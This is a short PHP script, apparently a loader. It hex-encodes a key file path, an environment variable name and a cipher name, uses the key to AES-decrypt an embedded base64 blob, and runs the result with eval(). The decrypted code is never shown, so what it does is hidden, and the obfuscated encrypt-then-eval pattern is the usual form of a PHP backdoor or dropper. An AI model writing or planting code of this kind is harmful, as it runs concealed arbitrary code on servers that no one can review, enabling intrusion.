<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('kTbJpSUhw3DWPHobRTY7vw==');

$c=base64_decode(

'paMFxn6LxxnYCG3xF7CRhWLH5Db9UurIg/aBqIGw8dCfBplVI106mbL76JaCZtIwjMdUdPtaPngh' .
'19xi6V8q8A5PP0KuBeqOS1CHuhFvaKbLq0kq4ASxkCC7wttJxU6nB6zygGys4VL3TiCRRg1rJgmX' .
'csiTK6GhsG577LYfUXQvf33Kks61H39bf/oL93gUvlXFL+30OEXmNc2uVEo0+/QPR+APGEFsEmfl' .
'nXx+XSU/L8kNtxp2qMrCpj3n+UEn5KJV1qMD8jqYEoIdtfdgHPEpxjqgUU7Lgup5MKfa/iWOz31p' .
'VbPSfVKfY+CqdJ3RWndgrrUCUeaSELNz89pgkhEI4pDLzXqDpMNQ7X5YMBfCsSoTMj/h/4ysr14t' .
'4Ed0WP+5st/BgAPB3Bl400AK05hHcm3k9p2XM1fzm5kOGdSsHRyi40HzRQXCkywccEEoeJB/G8PK' .
'AV5blBO0KN/FaKUcssQhQKcENSIrUT+PM/SRJRTfAle1U9WHapCWWPOsGXeQA97oN9OSBaAet/01' .
'qA7t/C+ksVykTS+uQutHj/j+qIV+1tToEX+jLne5WhyUSdZEOSbHMT7Zv3UP1mPvNg7YRnUv8S0d' .
'ooUDUOD3p1Rgia0QWF0qaZY3itVLqxD/0bNdTQnLGbdttHWvoQcAP1M2DHt6yyMvS+ekWg92j+mD' .
'8tON3LnL9txyYop9NjT7vpI5al0aWFzHqjJs+HTkKA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

